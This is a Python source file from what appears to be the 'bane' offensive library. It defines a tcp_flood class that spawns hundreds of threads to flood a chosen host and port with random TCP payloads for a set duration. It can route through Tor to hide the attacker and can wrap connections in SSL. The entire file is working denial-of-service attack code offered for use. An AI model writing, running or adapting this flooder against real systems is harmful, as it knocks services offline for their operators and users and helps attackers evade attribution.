from bane.ddos.utils import *

class tcp_flood(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        min_size=10,
        max_size=50,
        threads=500,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        logs=False,
        tor=False,
        ssl_on=False
    ):
        self.ssl_on=ssl_on
        self.logs = logs
        self.stop = False
        self.counter = 0
        self.fails=0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.min_size = min_size
        self.max_size = max_size
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)  # give time for all threads to be created
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    if self.tor==True:
                        s=Socket_Connection.get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                    else:
                        s=Socket_Connection.get_socket_connection(self.target,self.port,timeout=self.timeout)
                    if self.port==443 or self.ssl_on==True:
                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                    for l in range(
                        random.randint(self.round_min, self.round_max)
                    ):  # send packets with random number of times for each connection (number between "round_min" and "round_max")
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        m = ""
                        for li in range(
                            random.randint(self.min_size, self.max_size)
                        ):  # each payload' size is chosen randomly between maximum and minimum values
                            m += random.choice(Common_Variables.source_string)
                        try:
                            if self.stop == True:
                                break
                            s.send(m.encode("utf-8"))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    "\rPackets: {} | Bytes: {}   ".format(
                                        self.counter, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print("Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
                            time.sleep(self.interval)
                        except:
                            self.fails+=1
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    self.fails+=1
                time.sleep(0.1)
            self.kill()
        except:
            pass


